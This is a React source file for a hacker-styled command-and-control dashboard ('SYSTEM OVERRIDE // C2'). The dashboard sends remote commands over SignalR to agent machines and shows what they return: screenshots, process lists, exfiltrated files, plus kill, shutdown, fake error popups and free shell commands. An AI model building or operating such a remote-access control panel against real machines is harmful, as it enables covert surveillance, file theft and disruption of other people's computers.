import { useEffect, useState, useRef } from 'react';
import { HubConnectionBuilder } from '@microsoft/signalr';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from 'recharts';
import { Terminal, Activity, Camera, Skull, Power, MessageSquare, Globe, AlertTriangle } from 'lucide-react';

function App() {
  const [connection, setConnection] = useState(null);
  const [dataPoints, setDataPoints] = useState([]);
  const [latestCpu, setLatestCpu] = useState("0");
  const [logs, setLogs] = useState([]);
  const [command, setCommand] = useState("");
  const [processes, setProcesses] = useState([]);
  const [screenshot, setScreenshot] = useState(null);
  const logEndRef = useRef(null);

  useEffect(() => {
    const newConnection = new HubConnectionBuilder()
      .withUrl("http://localhost:5000/agentHub")
      .withAutomaticReconnect()
      .build();
    setConnection(newConnection);
  }, []);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  useEffect(() => {
    if (connection) {
      connection.start()
        .then(() => {
          console.log("Connected to C2");
          connection.on("ReceiveHeartbeat", (machine, cpu) => {
            setLatestCpu(cpu);
            setDataPoints(prev => [...prev, { name: new Date().toLocaleTimeString(), cpu: parseFloat(cpu) }].slice(-30));
          });
          connection.on("ReceiveLog", (log) => setLogs(prev => [...prev.slice(-49), log]));
          connection.on("ReceiveScreenshot", (base64) => setScreenshot("data:image/jpeg;base64," + base64));
          connection.on("ReceiveProcessList", (json) => setProcesses(JSON.parse(json)));
          connection.on("ReceiveFile", (fileName, base64) => {
            const link = document.createElement("a");
            link.href = "data:application/octet-stream;base64," + base64;
            link.download = fileName;
            link.click();
            setLogs(prev => [...prev, `[SUCCESS] Downloaded: ${fileName}`]);
          });
        })
        .catch(e => console.log("Connection Error: ", e));
    }
  }, [connection]);

  const sendCmd = async (cmd) => {
    if (!connection) return;
    setLogs(prev => [...prev, `root@C2:~$ ${cmd}`]);
    await connection.invoke("DispatchCommand", cmd);
  };

  const handleInputCmd = async () => {
    if (!command) return;
    await sendCmd(command);
    setCommand("");
  };

  const styles = {
    container: { backgroundColor: '#050505', color: '#00ff41', minHeight: '100vh', padding: '20px', fontFamily: 'Courier New, monospace' },
    header: { borderBottom: '2px solid #00ff41', paddingBottom: '10px', marginBottom: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', textShadow: '0 0 10px #00ff41' },
    grid: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' },
    panel: { border: '1px solid #333', padding: '15px', backgroundColor: '#0a0a0a', boxShadow: '0 0 10px rgba(0, 255, 65, 0.1)' },
    btnGroup: { display: 'flex', gap: '10px', flexWrap: 'wrap', marginBottom: '10px' },
    btn: { background: '#111', color: '#00ff41', border: '1px solid #00ff41', padding: '8px 12px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '5px', fontSize: '12px' },
    btnDanger: { background: '#300', color: 'red', border: '1px solid red' },
    input: { background: 'transparent', border: 'none', color: '#00ff41', width: '100%', outline: 'none', marginLeft: '10px', fontWeight: 'bold' }
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <h1><Terminal size={24} style={{ marginBottom: -4 }} /> SYSTEM OVERRIDE // C2</h1>
        <div>CPU LOAD: {latestCpu}%</div>
      </div>

      <div style={styles.grid}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

          <div style={{ ...styles.panel, height: '250px' }}>
            <h3 style={{ marginTop: 0 }}><Activity size={16} /> LIVE METRICS</h3>
            <ResponsiveContainer width="100%" height="80%">
              <LineChart data={dataPoints}>
                <CartesianGrid strokeDasharray="3 3" stroke="#333" />
                <YAxis domain={[0, 100]} stroke="#00ff41" tick={false} />
                <Line type="step" dataKey="cpu" stroke="#00ff41" strokeWidth={2} dot={false} />
              </LineChart>
            </ResponsiveContainer>
          </div>

          <div style={styles.panel}>
            <h3 style={{ marginTop: 0 }}>QUICK ACTIONS</h3>

            <div style={{ ...styles.btnGroup, borderBottom: '1px solid #333', paddingBottom: 10 }}>
              <button style={styles.btn} onClick={() => sendCmd("screenshot")}><Camera size={14} /> SCREENSHOT</button>
              <button style={styles.btn} onClick={() => sendCmd("getprocs")}><Activity size={14} /> PROCESS LIST</button>
            </div>

            <div style={{ ...styles.btnGroup, borderBottom: '1px solid #333', paddingBottom: 10 }}>
              <button style={styles.btn} onClick={() => {
                const url = prompt("URL Gir:");
                if (url) sendCmd(`openurl ${url}`);
              }}><Globe size={14} /> OPEN URL</button>

              <button style={styles.btn} onClick={() => {
                const txt = prompt("Ne söylesin?");
                if (txt) sendCmd(`speak ${txt}`);
              }}><MessageSquare size={14} /> SPEAK</button>

              <button style={styles.btn} onClick={() => {
                const msg = prompt("Hata Mesajı:");
                if (msg) sendCmd(`msgbox ${msg}`);
              }}><AlertTriangle size={14} /> FAKE ERROR</button>
            </div>

            <div style={styles.btnGroup}>
              <button style={{ ...styles.btn, ...styles.btnDanger }} onClick={() => { if (confirm("KAPATILSIN MI?")) sendCmd("shutdown") }}><Power size={14} /> SHUTDOWN</button>
              <button style={{ ...styles.btn, ...styles.btnDanger }} onClick={() => { if (confirm("RESTART MI?")) sendCmd("restart") }}><Skull size={14} /> RESTART</button>
            </div>
          </div>

          <div style={{ ...styles.panel, flex: 1, overflowY: 'auto', maxHeight: '300px' }}>
            <h3 style={{ marginTop: 0 }}>ACTIVE TASKS ({processes.length})</h3>
            <table style={{ width: '100%', fontSize: '12px', textAlign: 'left' }}>
              <tbody>
                {processes.map(p => (
                  <tr key={p.Id}>
                    <td style={{ color: '#666' }}>{p.Id}</td>
                    <td>{p.ProcessName}</td>
                    <td>{p.Memory}</td>
                    <td><button style={{ ...styles.btn, ...styles.btnDanger, padding: '2px 5px', fontSize: '10px' }} onClick={() => sendCmd(`kill ${p.Id}`)}>KILL</button></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

          <div style={{ ...styles.panel, height: '400px', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
            {screenshot ? <img src={screenshot} style={{ maxWidth: '100%', maxHeight: '100%', border: '1px solid #00ff41' }} /> : <div style={{ opacity: 0.5 }}>NO SIGNAL</div>}
          </div>

          <div style={{ ...styles.panel, flex: 1, display: 'flex', flexDirection: 'column' }}>
            <div style={{ flex: 1, overflowY: 'auto', marginBottom: '10px', fontSize: '13px', whiteSpace: 'pre-wrap', color: '#ccc' }}>
              {logs.map((log, i) => <div key={i}>{log}</div>)}
              <div ref={logEndRef} />
            </div>
            <div style={{ display: 'flex', borderTop: '1px solid #333', paddingTop: '10px' }}>
              <span>root@C2:~$</span>
              <input
                type="text"
                style={styles.input}
                value={command}
                onChange={e => setCommand(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleInputCmd()}
                placeholder="Enter command (e.g., 'dir', 'download test.txt')..."
                autoFocus
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;